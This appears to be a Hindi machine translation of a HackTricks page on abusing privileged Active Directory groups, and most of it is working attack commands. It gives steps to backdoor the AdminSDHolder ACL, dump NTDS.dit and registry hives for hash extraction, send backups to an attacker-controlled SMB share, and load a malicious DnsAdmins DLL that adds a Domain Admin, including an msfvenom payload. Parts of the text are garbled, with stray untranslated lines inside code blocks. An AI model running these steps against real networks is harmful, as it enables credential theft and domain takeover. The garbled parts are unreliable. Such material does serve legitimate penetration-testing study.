# विशेषाधिकारित समूह

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## प्रशासनिक विशेषाधिकारों वाले प्रसिद्ध समूह

* **प्रशासक**
* **डोमेन व्यवस्थापक**
* **एंटरप्राइज व्यवस्थापक**

## खाता ऑपरेटर्स

यह समूह डोमेन पर प्रशासक नहीं होने वाले खाते और समूह बनाने की शक्ति प्रदान करता है। इसके अतिरिक्त, यह डोमेन कंट्रोलर (DC) में स्थानिक लॉगिन को सक्षम करता है।

इस समूह के सदस्यों की पहचान के लिए, निम्नलिखित कमांड को निष्पादित किया जाता है:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
नए उपयोगकर्ताओं को जोड़ने की अनुमति है, साथ ही DC01 में स्थानिक लॉगिन की अनुमति है।

## AdminSDHolder समूह

**AdminSDHolder** समूह का पहुंचन नियंत्रण सूची (ACL) महत्वपूर्ण है क्योंकि यह सभी "संरक्षित समूहों" के लिए अनुमतियाँ सेट करता है जो सक्रिय निर्देशिका में हैं, उच्च विशेषाधिकार समूहों सहित। यह तंत्र सुनिश्चित करता है कि इन समूहों की सुरक्षा को अनधिकृत संशोधनों से रोका जाता है।

किसी हमलावर को इसका शोध करने के लिए **AdminSDHolder** समूह की ACL को संशोधित करके, एक मानक उपयोगकर्ता को पूर्ण अनुमतियाँ प्रदान करके इसका शोध कर सकता है। यह उपयोगकर्ता उन सभी संरक्षित समूहों पर पूर्ण नियंत्रण प्रदान करेगा। यदि इस उपयोगकर्ता की अनुमतियाँ संशोधित या हटा दी जाती हैं, तो उन्हें स्वयं ही एक घंटे के भीतर पुनः स्थापित कर दिया जाएगा क्योंकि प्रणाली के डिज़ाइन के कारण।

सदस्यों की समीक्षा और अनुमतियों को संशोधित करने के लिए निम्नलिखित कमांड्स शामिल हैं:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
एक स्क्रिप्ट उपलब्ध है जो पुनर्स्थापन प्रक्रिया को तेजी से पूरा करने में मदद करती है: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

अधिक विवरण के लिए, [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) पर जाएं।

## AD Recycle Bin

इस समूह में सदस्यता विलीन किए गए एक्टिव डायरेक्टरी ऑब्जेक्ट को पढ़ने की अनुमति देती है, जो संवेदनशील जानकारी प्रकट कर सकता है:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### डोमेन कंट्रोलर एक्सेस

DC पर फ़ाइलों तक पहुंच केवल तब होती है जब उपयोगकर्ता `Server Operators` समूह का हिस्सा है, जो पहुंच का स्तर बदल देता है।

### विशेषाधिकार उन्नति

`PsService` या `sc` का उपयोग Sysinternals से करके, कोई व्यक्ति सेवा अनुमतियों की जांच और संशोधन कर सकता है। उदाहरण के लिए, `Server Operators` समूह के पास कुछ सेवाओं पर पूर्ण नियंत्रण होता है, जिससे विभिन्न आदेशों का क्रियान्वयन और विशेषाधिकार उन्नति संभव होती है:
```cmd
C:\> .\PsService.exe security AppReadiness
```
यह कमांड दिखाती है कि `सर्वर ऑपरेटर्स` के पूर्ण एक्सेस है, जिससे सेवाओं को ऊंचा विशेषाधिकार के लिए परिवर्तित किया जा सकता है।

## बैकअप ऑपरेटर्स

`बैकअप ऑपरेटर्स` समूह में सदस्यता `DC01` फ़ाइल सिस्टम तक पहुंच प्रदान करती है क्योंकि `SeBackup` और `SeRestore` विशेषाधिकार हैं। ये विशेषाधिकार फ़ोल्डर ट्रावर्सल, सूचीकरण, और फ़ाइल कॉपींग क्षमताएँ सक्षम करते हैं, यहाँ तक कि `FILE_FLAG_BACKUP_SEMANTICS` फ़्लैग का उपयोग किए बिना भी। इस प्रक्रिया के लिए विशेष स्क्रिप्ट का उपयोग आवश्यक है।

समूह के सदस्यों को सूचीत करने के लिए, निम्नलिखित का निष्पादन करें:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### स्थानीय हमला

इन प्राधिकारों का उपयोग स्थानीय रूप से करने के लिए, निम्नलिखित चरण अपनाए जाते हैं:

1. आवश्यक पुस्तकालयों को आयात करें:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` सक्षम करें और सत्यापित करें:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. पहुंच और फ़ाइलें प्रतिबंधित निर्देशिकाओं से एक्सेस और कॉपी करें, उदाहरण के लिए:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD हमला

डोमेन कंट्रोलर के फ़ाइल सिस्टम का सीधा उपयोग `NTDS.dit` डेटाबेस की चोरी की अनुमति देता है, जिसमें डोमेन उपयोगकर्ताओं और कंप्यूटरों के लिए सभी NTLM हैश होते हैं।

#### diskshadow.exe का उपयोग

1. `C` ड्राइव की शैडो कॉपी बनाएं:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. शैडो कॉपी से `NTDS.dit` की कॉपी करें:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
विकल्प से, फ़ाइल की कॉपी के लिए `robocopy` का उपयोग करें:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. हैश प्राप्ति के लिए `SYSTEM` और `SAM` को निकालें:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` से सभी हैश पुनः प्राप्त करें:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### एडमिनिस्ट्रेटर ग्रुप और टोकन प्रिविलेजेस

1. हमलावर मशीन पर एसएमबी सर्वर के लिए एनटीएफएस फाइल सिस्टम सेटअप करें और लक्षित मशीन पर एसएमबी क्रेडेंशियल कैश करें।
2. सिस्टम बैकअप और `NTDS.dit` निकालने के लिए `wbadmin.exe` का उपयोग करें:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

एक व्यावहारिक प्रदर्शन के लिए, देखें [डेमो वीडियो विथ आईपीपीएसेक](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** ग्रुप के सदस्य अपनी प्रिविलेजेस का शोषण करने के लिए एक अर्बिट्रेरी DLL को सिस्टम प्रिविलेजेस के साथ एक DNS सर्वर पर लोड कर सकते हैं, जो अक्सर डोमेन कंट्रोलर पर होस्ट किया जाता है। यह क्षमता महत्वपूर्ण शोषण संभावना प्रदान करती है।

DnsAdmins ग्रुप के सदस्यों की सूची देखने के लिए, इस्तेमाल करें:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### कार्यात्मक DLL को क्रियान्वित करें

सदस्य DNS सर्वर को एक कार्यात्मक DLL लोड करने के लिए निम्नलिखित कमांड का उपयोग कर सकते हैं:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
**Translation:**
```
DNS सेवा को पुनः आरंभ करना (जिसके लिए अतिरिक्त अनुमतियाँ आवश्यक हो सकती हैं) DLL को लोड किया जाना आवश्यक है:
```
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
### Mimilib.dll
मिमीलिब.dll का उपयोग भी संभव है कमांड निष्पादन के लिए, इसे विशिष्ट कमांड या रिवर्स शैल्स निष्पादित करने के लिए संशोधित करना। [इस पोस्ट की जाँच करें](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) अधिक जानकारी के लिए।

### WPAD Record for MitM
DnsAdmins DNS रिकॉर्ड को मान-इन-द-मिडल (MitM) हमले करने के लिए प्रयोग कर सकते हैं, ग्लोबल क्वेरी ब्लॉक सूची को अक्षम करने के बाद एक WPAD रिकॉर्ड बनाकर। रिस्पॉन्डर या इनवेग जैसे उपकरणों का उपयोग स्पूफिंग और नेटवर्क ट्रैफिक को कैप्चर करने के लिए किया जा सकता है।

### Event Log Readers
सदस्य घटना लॉग तक पहुंच सकते हैं, संभावित रूप से संवेदनशील जानकारी जैसे सादा पासवर्ड या कमांड निष्पादन विवरण खोज सकते हैं:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## एक्सचेंज विंडोज़ अनुमतियाँ
यह समूह डोमेन ऑब्जेक्ट पर DACLs को संशोधित कर सकता है, जिससे DCSync विशेषाधिकार प्राप्त किए जा सकते हैं। इस समूह का शासन उन्नतिकरण के लिए तकनीकों का विवरण Exchange-AD-Privesc GitHub रेपो में दिया गया है।
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## हाइपर-वी व्यवस्थापक
हाइपर-वी व्यवस्थापकों को हाइपर-वी का पूरा उपयोग मिलता है, जिसे वर्चुअलाइज्ड डोमेन कंट्रोलर पर नियंत्रण प्राप्त करने के लिए उपयोग किया जा सकता है। इसमें लाइव डीसी क्लोनिंग और NTDS.dit फ़ाइल से NTLM हैश निकालना शामिल है।

### शोषण उदाहरण
Firefox का Mozilla रखरखाव सेवा हाइपर-वी व्यवस्थापकों द्वारा SYSTEM के रूप में कमांड निष्पादित करने के लिए शोषित किया जा सकता है। इसमें सुरक्षित SYSTEM फ़ाइल के लिए एक हार्ड लिंक बनाना और इसे एक दुरुपयोगी कार्यक्रम से बदल देना शामिल है:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## संगठन प्रबंधन

जहां **Microsoft Exchange** लागू है, एक विशेष समूह जिसे **संगठन प्रबंधन** के रूप में जाना जाता है, महत्वपूर्ण क्षमताओं को धारण करता है। यह समूह **सभी डोमेन उपयोगकर्ताओं के मेलबॉक्स तक पहुंचने** और **'Microsoft Exchange सुरक्षा समूह'** संगठनिक इकाई पर **पूर्ण नियंत्रण बनाए रखता है**। इस नियंत्रण में **`Exchange Windows Permissions`** समूह शामिल है, जिसका उपयोग विशेषाधिकार उन्नति के लिए किया जा सकता है।

### विशेषाधिकार शोषण और कमांड

#### प्रिंट ऑपरेटर्स
**प्रिंट ऑपरेटर्स** समूह के सदस्य कई विशेषाधिकारों से सम्पन्न होते हैं, जिसमें से एक है **`SeLoadDriverPrivilege`**, जो उन्हें **स्थानीय रूप से एक डोमेन नियंत्रक पर लॉग ऑन करने**, इसे बंद करने और प्रिंटर प्रबंधित करने की अनुमति देता है। इन विशेषाधिकारों का शोषण करने के लिए, विशेषतः अगर **`SeLoadDriverPrivilege`** एक अनउच्चित संदर्भ के तहत दिखाई नहीं देता है, तो उपयोगकर्ता खाता नियंत्रण (UAC) को छलकरना आवश्यक है।

इस समूह के सदस्यों की सूची देखने के लिए, निम्नलिखित PowerShell कमांड का उपयोग किया जाता है:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
### रिमोट डेस्कटॉप उपयोगकर्ता
इस समूह के सदस्यों को रिमोट डेस्कटॉप प्रोटोकॉल (RDP) के माध्यम से PC तक पहुंचने की अनुमति है। इन सदस्यों की जांच के लिए, PowerShell कमांड उपलब्ध हैं:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
#### दूरस्थ प्रबंधन उपयोगकर्ता
सदस्य **Windows Remote Management (WinRM)** के माध्यम से PC तक पहुंच सकते हैं। इन सदस्यों की जाँच निम्नलिखित द्वारा की जाती है:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
### सर्वर ऑपरेटर्स
इस समूह को डोमेन कंट्रोलर्स पर विभिन्न कॉन्फ़िगरेशन करने की अनुमति है, जिसमें बैकअप और रीस्टोर विशेषाधिकार, सिस्टम समय बदलना, और सिस्टम बंद करना शामिल है। सदस्यों की सूचीकरण के लिए, दिया गया कमांड है:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## संदर्भ <a href="#संदर्भ" id="संदर्भ"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) से या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **PRs सबमिट** करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
